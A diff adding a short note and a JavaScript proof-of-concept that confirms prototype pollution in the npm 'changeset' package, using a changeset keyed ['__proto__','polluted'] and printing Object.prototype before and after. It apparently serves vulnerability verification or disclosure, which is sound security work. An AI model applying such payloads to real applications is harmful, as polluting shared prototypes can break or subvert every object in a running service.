@@ -1,0 +1,20 @@
+Confirmed: prototype pollution works (`Object.prototype.polluted` becomes `"yes"`).
+
+```javascript
+var changeset = require("./node_modules/changeset");
+
+// Object.prototype is clean before the exploit
+console.log("Before:", ({}).polluted);
+
+// A malicious changeset whose key path includes "__proto__"
+var changes = [
+  { type: "put", key: ["__proto__", "polluted"], value: "yes" }
+];
+
+// apply() walks ch.key segments and does ptr[prop] = {} / ptr = ptr[prop]
+// without filtering "__proto__", so this pollutes Object.prototype
+changeset.apply(changes, {}, true);
+
+// Every object in the process is now polluted
+console.log("After:", ({}).polluted);
+```
